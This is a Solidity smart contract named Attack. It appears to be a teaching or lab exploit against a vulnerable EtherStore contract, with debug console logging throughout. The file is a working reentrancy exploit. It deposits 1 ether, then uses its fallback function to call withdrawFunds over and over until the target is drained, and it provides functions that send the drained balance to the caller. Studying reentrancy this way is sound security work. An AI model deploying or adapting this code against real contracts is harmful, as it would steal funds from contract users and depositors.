pragma solidity ^0.5.0;

import "./EtherStore.sol";

import "@nomiclabs/buidler/console.sol";

contract Attack {
    EtherStore private etherStore;

    event eventAttackFallBack(
        uint256 avlBalance
    );

    // intialise the etherStore variable with the contract address
    constructor(address payable _etherStoreAddress) public {
        etherStore = EtherStore(_etherStoreAddress);
        console.log("Info@Attack.sol::constructor ContBal(%s)", address(this).balance );
    }

    function debugPrintBalance() public payable {
        console.log("Info@Attack.sol::debugPrintBalance ContBal(%s)", address(this).balance );
    }

    function pwnEtherStore() public payable {

        console.log("Info@Attack.sol::pwnEtherStore Sender(%s)", msg.sender );
        console.log("Info@Attack.sol::pwnEtherStore Val(%s)", msg.value );
        console.log("Info@Attack.sol::pwnEtherStore ContBal(%s)", address(this).balance );

        etherStore.debugPrintBalance();

        emit eventAttackFallBack( address(this).balance );

        // attack to the nearest ether
        require(msg.value >= 1 ether);

        // send eth to the depositFunds() function
        etherStore.depositFunds.value(1 ether)();

        console.log("Info@Attack.sol::pwnEtherStore ContBal(%s)", address(this).balance );

        // start the magic
        etherStore.withdrawFunds(1 ether);

        console.log("Info@Attack.sol::pwnEtherStore ContBal(%s)", address(this).balance );

        etherStore.debugPrintBalance();

        emit eventAttackFallBack( address(this).balance );

    }

    function collectEther() public {

        console.log("Info@Attack.sol::collectEther ContBal(%s)", address(this).balance );
        msg.sender.transfer(address(this).balance);
    }

    // fallback function - where the magic happens
    function() external payable {

        console.log("Info@Attack.sol::fallback Ent ContBal(%s)", address(this).balance );

        emit eventAttackFallBack( address(this).balance );

        if (address(etherStore).balance > 1 ether) {
            etherStore.withdrawFunds(1 ether);
        }

        console.log("Info@Attack.sol::fallback Ext ContBal(%s)", address(this).balance );
    }

    function withdrawEth() public {
        msg.sender.transfer( address(this).balance );
    }

}
